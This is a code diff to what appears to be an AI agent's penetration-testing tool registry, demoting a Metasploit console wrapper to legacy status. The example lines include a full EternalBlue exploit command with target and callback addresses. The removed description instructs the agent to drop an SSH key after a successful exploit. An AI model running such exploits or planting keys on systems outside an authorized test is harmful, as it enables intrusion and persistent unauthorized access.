@@ -4,24 +4,21 @@ from tools.base import Tool, Param
 def msf_command(a: dict) -> list[str]:
     return ["msfconsole", "-q", "-x", a["commands"]]
 
-metasploit = register(Tool(
+metasploit_legacy = register(Tool(
     name="metasploit",
     description=(
-        "Execute Metasploit Framework (msfconsole) commands. Use this for complex exploitation "
-        "and payload generation. Metasploit is stateful in an interactive session, but here you "
-        "must pass a sequence of commands separated by semicolons. "
-        "Always end your command sequence with 'exit' to terminate the console and return output. "
-        "If an exploit succeeds, instruct the payload to drop an SSH key or run a specific command, "
-        "as the session will be lost when msfconsole exits."
-        "Keep in mind there are more exploits than just SMB."
+        "[LEGACY/DEPRECATED] Execute Metasploit Framework (msfconsole) commands via CLI. "
+        "Prefer msf_search, msf_exploit, and msf_sessions instead — they use the RPC API "
+        "and are faster, structured, and don't lose sessions on exit. "
+        "Only use this tool if the RPC connection is unavailable."
     ),
     params=[
         Param("commands", "string", "A string of msfconsole commands separated by semicolons."),
     ],
     build_command=msf_command,
+    category="foothold",
     examples=[
         "search type:exploit name:eternalblue; exit",
-        "use exploit/windows/smb/ms17_010_eternalblue; info; exit",
         "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.5; set LHOST 192.168.1.10; exploit; exit"
     ]
 ))
